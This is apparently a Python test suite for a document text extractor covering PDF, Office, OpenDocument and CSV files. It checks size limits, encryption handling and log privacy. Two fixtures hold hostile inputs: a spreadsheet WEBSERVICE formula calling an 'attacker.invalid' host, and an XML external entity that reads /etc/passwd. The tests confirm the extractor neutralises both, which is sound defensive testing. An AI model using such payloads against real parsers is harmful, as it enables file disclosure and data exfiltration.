"""Bounded public PDF/Office/text extraction preserves independent original bytes."""

import asyncio
import dataclasses
import io
import logging
import threading
import zipfile
from collections.abc import Callable

import anyio
import httpx
import pytest
from pypdf import PdfReader, PdfWriter
from pypdf.generic import (
    DecodedStreamObject,
    DictionaryObject,
    NameObject,
    TextStringObject,
)

from azents.core.google_oauth import GoogleOAuthError
from azents.services.google_workspace.extraction import (
    GoogleExtractedText,
    GoogleExtractionLimits,
    extract_text,
)
from azents.services.google_workspace.file_models import GooglePreparedFile
from azents.services.google_workspace.transport import GoogleSdkError, GoogleSdkSession
from azents.services.google_workspace.transport_test import _limits as _sdk_limits
from azents.services.google_workspace.transport_test import _sdk

_OOXML = "http://schemas.openxmlformats.org/"
_SHEET_NS = _OOXML + "spreadsheetml/2006/main"
_PRESENTATION_NS = _OOXML + "presentationml/2006/main"
_RELATION_NS = _OOXML + "officeDocument/2006/relationships"


def _limits() -> GoogleExtractionLimits:
    return GoogleExtractionLimits(
        maximum_input_bytes=1024 * 1024,
        maximum_expanded_bytes=4 * 1024 * 1024,
        maximum_pages=10,
        maximum_cells=1000,
        maximum_xml_nodes=10000,
        maximum_characters=10000,
    )


def _archive(entries: dict[str, str]) -> bytes:
    with io.BytesIO() as stream:
        with zipfile.ZipFile(stream, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            for name, content in entries.items():
                archive.writestr(name, content)
        return stream.getvalue()


def _pdf(*, pages: int, password: str | None) -> bytes:
    writer = PdfWriter()
    for index in range(pages):
        page = writer.add_blank_page(width=100, height=100)
        font = DictionaryObject(
            {
                NameObject("/Type"): NameObject("/Font"),
                NameObject("/Subtype"): NameObject("/Type1"),
                NameObject("/BaseFont"): NameObject("/Helvetica"),
            }
        )
        page[NameObject("/Resources")] = DictionaryObject(
            {NameObject("/Font"): DictionaryObject({NameObject("/F1"): font})}
        )
        content = DecodedStreamObject()
        content.set_data(
            f"BT /F1 12 Tf 10 50 Td (Page {index + 1} text) Tj ET".encode()
        )
        page[NameObject("/Contents")] = content
    if password is not None:
        writer.encrypt(password)
    with io.BytesIO() as stream:
        writer.write(stream)
        return stream.getvalue()


@pytest.mark.parametrize(
    "media,content,expected",
    [
        ("text/plain", b"hello world", "hello world"),
        ("text/csv", b"one,two\nthree,four\n", "one,two\nthree,four\n"),
        ("text/tab-separated-values", b"one\ttwo", "one\ttwo"),
        ("application/json", b'{"hello":true}', '{"hello":true}'),
    ],
)
def test_text_and_csv_output_is_bounded_without_formula_evaluation(
    media: str, content: bytes, expected: str
) -> None:
    file = GooglePreparedFile("source.txt", media, content, ())
    result = extract_text(file, _limits(), lambda: None)
    assert result.status == "complete" and result.text == expected
    assert file.content == content


def test_text_truncation_is_explicit() -> None:
    result = extract_text(
        GooglePreparedFile("source.txt", "text/plain", b"hello world", ()),
        dataclasses.replace(_limits(), maximum_characters=4),
        lambda: None,
    )
    assert result.status == "truncated" and result.text == "hell"


def test_invalid_utf8_original_can_still_be_transferred() -> None:
    file = GooglePreparedFile("source.txt", "text/plain", b"\xfforiginal", ())
    result = extract_text(file, _limits(), lambda: None)
    assert result.status == "invalid_encoding" and result.text is None
    assert file.content == b"\xfforiginal"


def test_csv_cell_budget_is_independent_of_original_transfer_limit() -> None:
    file = GooglePreparedFile("table.csv", "text/csv", b"1,2,3\n4,5,6\n", ())
    result = extract_text(
        file, dataclasses.replace(_limits(), maximum_cells=5), lambda: None
    )
    assert result.status == "parser_limit" and file.size == 12


def test_pdf_text_extraction_uses_public_reader_without_ocr() -> None:
    file = GooglePreparedFile(
        "source.pdf", "application/pdf", _pdf(pages=2, password=None), ()
    )
    result = extract_text(file, _limits(), lambda: None)
    assert result.status == "complete"
    assert (
        result.text is not None
        and "Page 1 text" in result.text
        and "Page 2 text" in result.text
    )


async def test_pdf_warning_content_is_private_without_muting_other_contexts(
    caplog: pytest.LogCaptureFixture,
) -> None:
    reader = PdfReader(io.BytesIO(_pdf(pages=1, password=None)))
    page = reader.pages[0]
    resources = page["/Resources"]
    assert isinstance(resources, DictionaryObject)
    fonts = resources["/Font"]
    assert isinstance(fonts, DictionaryObject)
    font = fonts["/F1"]
    assert isinstance(font, DictionaryObject)
    canary = "PRIVATE-PDF-CONTENT-CANARY"
    font[NameObject("/Widths")] = TextStringObject(canary)
    writer = PdfWriter()
    writer.add_page(page)
    with io.BytesIO() as buffer:
        writer.write(buffer)
        file = GooglePreparedFile(
            "warning.pdf", "application/pdf", buffer.getvalue(), ()
        )
    caplog.set_level(logging.WARNING, logger="pypdf.generic._font")
    # Prove the real parser reaches its sensitive warning, rather than passing
    # vacuously because this fixture did not exercise the warning path.
    assert extract_text(file, _limits(), lambda: None).status == "complete"
    assert canary in caplog.text
    caplog.clear()
    parsed = anyio.Event()
    release = threading.Event()

    def operation(session: GoogleSdkSession) -> GoogleExtractedText:
        result = extract_text(file, _limits(), session.require_current)
        anyio.from_thread.run_sync(parsed.set)
        if not release.wait(timeout=5):
            raise AssertionError("Parser diagnostic synchronization timed out.")
        return result

    task = asyncio.create_task(
        _sdk(lambda request: httpx.Response(200)).run(
            access_token="fixture",
            limits=_sdk_limits(),
            proxy_url=None,
            before_request=lambda: None,
            operation=operation,
        )
    )
    try:
        async with asyncio.timeout(3):
            await parsed.wait()
        logging.getLogger("pypdf.generic._font").warning(
            "Unrelated parser operation remains observable."
        )
    finally:
        release.set()
    result = await task
    assert result.status == "complete" and "Page 1 text" in (result.text or "")
    assert canary not in caplog.text
    assert "Unrelated parser operation remains observable." in caplog.text


def test_pdf_encryption_does_not_claim_text_extraction() -> None:
    file = GooglePreparedFile(
        "source.pdf", "application/pdf", _pdf(pages=1, password="fixture"), ()
    )
    result = extract_text(file, _limits(), lambda: None)
    assert result.status == "encrypted" and result.text is None
    assert file.content.startswith(b"%PDF")


def test_pdf_page_limit_and_character_budget_are_explicit() -> None:
    file = GooglePreparedFile(
        "source.pdf", "application/pdf", _pdf(pages=2, password=None), ()
    )
    assert (
        extract_text(
            file, dataclasses.replace(_limits(), maximum_pages=1), lambda: None
        ).status
        == "parser_limit"
    )
    result = extract_text(
        file, dataclasses.replace(_limits(), maximum_characters=4), lambda: None
    )
    assert result.status == "truncated" and result.text == "Page"


def test_pdf_decompression_budget_is_enforced_by_public_configuration() -> None:
    writer = PdfWriter()
    page = writer.add_blank_page(width=100, height=100)
    content = DecodedStreamObject()
    content.set_data(b" " * 100000)
    page[NameObject("/Contents")] = content.flate_encode()
    with io.BytesIO() as stream:
        writer.write(stream)
        raw = stream.getvalue()
    result = extract_text(
        GooglePreparedFile("compressed.pdf", "application/pdf", raw, ()),
        dataclasses.replace(_limits(), maximum_expanded_bytes=1024),
        lambda: None,
    )
    assert result.status == "parser_limit" and result.text is None


def test_malformed_pdf_does_not_create_false_text() -> None:
    result = extract_text(
        GooglePreparedFile("source.pdf", "application/pdf", b"not a PDF", ()),
        _limits(),
        lambda: None,
    )
    assert result.status == "malformed" and result.text is None


def test_docx_text_extraction_preserves_unicode_and_paragraphs() -> None:
    data = _archive(
        {
            "word/document.xml": (
                '<w:document xmlns:w="' + _OOXML + 'wordprocessingml/2006/main">'
                "<w:body><w:p><w:r><w:t>검토 문서</w:t></w:r></w:p>"
                "<w:p><w:r><w:t>Second paragraph</w:t></w:r></w:p>"
                "</w:body></w:document>"
            )
        }
    )
    file = GooglePreparedFile(
        "source.docx",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        data,
        (),
    )
    result = extract_text(file, _limits(), lambda: None)
    assert (
        result.status == "complete" and result.text == "검토 문서\nSecond paragraph\n"
    )
    assert file.content == data


def test_xlsx_reads_cached_values_and_never_evaluates_formulas_or_links() -> None:
    data = _archive(
        {
            "xl/workbook.xml": (
                f'<workbook xmlns="{_SHEET_NS}" xmlns:r="{_RELATION_NS}">'
                '<sheets><sheet name="Data" r:id="sheet1"/></sheets></workbook>'
            ),
            "xl/_rels/workbook.xml.rels": (
                '<Relationships><Relationship Id="sheet1" '
                f'Type="{_RELATION_NS}/worksheet" Target="worksheets/sheet1.xml"/>'
                "</Relationships>"
            ),
            "xl/sharedStrings.xml": (
                f'<sst xmlns="{_SHEET_NS}"><si><t>Shared text</t></si></sst>'
            ),
            "xl/worksheets/sheet1.xml": (
                f'<worksheet xmlns="{_SHEET_NS}"><sheetData><row>'
                '<c r="A1" t="s"><v>0</v></c>'
                '<c r="B1"><f>WEBSERVICE("https://attacker.invalid")</f><v>42</v></c>'
                "</row></sheetData></worksheet>"
            ),
        }
    )
    result = extract_text(
        GooglePreparedFile(
            "source.xlsx",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            data,
            (),
        ),
        _limits(),
        lambda: None,
    )
    assert result.status == "complete" and result.text is not None
    assert "A1=Shared text" in result.text and "B1=42" in result.text
    assert "attacker.invalid" not in result.text and "WEBSERVICE" not in result.text


def test_pptx_uses_presentation_order_not_archive_names() -> None:
    prefix = '<p:sld xmlns:p="urn:slide" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"><a:t>'
    suffix = "</a:t></p:sld>"
    data = _archive(
        {
            "ppt/presentation.xml": (
                f'<p:presentation xmlns:p="{_PRESENTATION_NS}" '
                f'xmlns:r="{_RELATION_NS}"><p:sldIdLst>'
                '<p:sldId r:id="tenth"/><p:sldId r:id="second"/>'
                "</p:sldIdLst></p:presentation>"
            ),
            "ppt/_rels/presentation.xml.rels": (
                '<Relationships><Relationship Id="tenth" '
                f'Type="{_RELATION_NS}/slide" Target="slides/slide10.xml"/>'
                '<Relationship Id="second" '
                f'Type="{_RELATION_NS}/slide" Target="slides/slide2.xml"/>'
                "</Relationships>"
            ),
            "ppt/slides/slide10.xml": prefix + "Tenth" + suffix,
            "ppt/slides/slide2.xml": prefix + "Second" + suffix,
        }
    )
    result = extract_text(
        GooglePreparedFile(
            "source.pptx",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            data,
            (),
        ),
        _limits(),
        lambda: None,
    )
    assert result.text is not None and result.text.index("Tenth") < result.text.index(
        "Second"
    )


def test_office_entities_are_rejected_without_external_resolution() -> None:
    data = _archive(
        {
            "word/document.xml": '<!DOCTYPE document [<!ENTITY external SYSTEM "file:///etc/passwd">]><document>&external;</document>'
        }
    )
    result = extract_text(
        GooglePreparedFile(
            "source.docx",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            data,
            (),
        ),
        _limits(),
        lambda: None,
    )
    assert result.status == "malformed" and result.text is None


def test_office_expansion_and_xml_node_limits_are_measured() -> None:
    data = _archive(
        {"word/document.xml": "<root>" + "<item>text</item>" * 100 + "</root>"}
    )
    file = GooglePreparedFile(
        "source.docx",
        "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        data,
        (),
    )
    assert (
        extract_text(
            file,
            dataclasses.replace(_limits(), maximum_expanded_bytes=100),
            lambda: None,
        ).status
        == "parser_limit"
    )
    assert (
        extract_text(
            file, dataclasses.replace(_limits(), maximum_xml_nodes=5), lambda: None
        ).status
        == "parser_limit"
    )


def test_open_document_encryption_is_reported_without_trying_to_decrypt() -> None:
    data = _archive(
        {
            "mimetype": "application/vnd.oasis.opendocument.text",
            "META-INF/manifest.xml": (
                '<manifest:manifest xmlns:manifest="'
                'urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">'
                "<manifest:encryption-data/></manifest:manifest>"
            ),
            "content.xml": "<document/>",
        }
    )
    result = extract_text(
        GooglePreparedFile(
            "source.odt", "application/vnd.oasis.opendocument.text", data, ()
        ),
        _limits(),
        lambda: None,
    )
    assert result.status == "encrypted" and result.text is None


def test_input_limit_precedes_pdf_parser_and_original_is_unchanged() -> None:
    file = GooglePreparedFile("source.pdf", "application/pdf", b"original content", ())
    result = extract_text(
        file, dataclasses.replace(_limits(), maximum_input_bytes=4), lambda: None
    )
    assert result.status == "input_limit" and file.content == b"original content"


def test_open_document_repeated_cells_are_bounded_and_cached_values_only() -> None:
    document = (
        '<office:document xmlns:office="'
        'urn:oasis:names:tc:opendocument:xmlns:office:1.0" '
        'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0">'
        '<table:table><table:table-row table:number-rows-repeated="2">'
        '<table:table-cell office:value="42" table:number-columns-repeated="2"/>'
        "</table:table-row></table:table></office:document>"
    )
    data = _archive(
        {
            "mimetype": "application/vnd.oasis.opendocument.spreadsheet",
            "content.xml": document,
        }
    )
    file = GooglePreparedFile(
        "source.ods",
        "application/vnd.oasis.opendocument.spreadsheet",
        data,
        (),
    )
    result = extract_text(file, _limits(), lambda: None)
    assert result.status == "complete" and result.text == "42\t42\n42\t42\n"
    limited = extract_text(
        file,
        dataclasses.replace(_limits(), maximum_cells=3),
        lambda: None,
    )
    assert limited.status == "parser_limit" and limited.text is None


@pytest.mark.parametrize(
    "error_factory",
    [
        lambda: GoogleSdkError("cancelled_or_timeout", dispatched=True, status=None),
        lambda: GoogleOAuthError(
            "capability_unavailable", "Current authorization withdrawn."
        ),
    ],
)
def test_mid_parse_current_admission_failure_is_not_hidden_as_malformed(
    error_factory: Callable[[], Exception],
) -> None:
    calls = 0

    def require_current() -> None:
        nonlocal calls
        calls += 1
        if calls > 1:
            raise error_factory()

    file = GooglePreparedFile("table.csv", "text/csv", b"one,two\n", ())
    with pytest.raises((GoogleSdkError, GoogleOAuthError)):
        extract_text(file, _limits(), require_current)
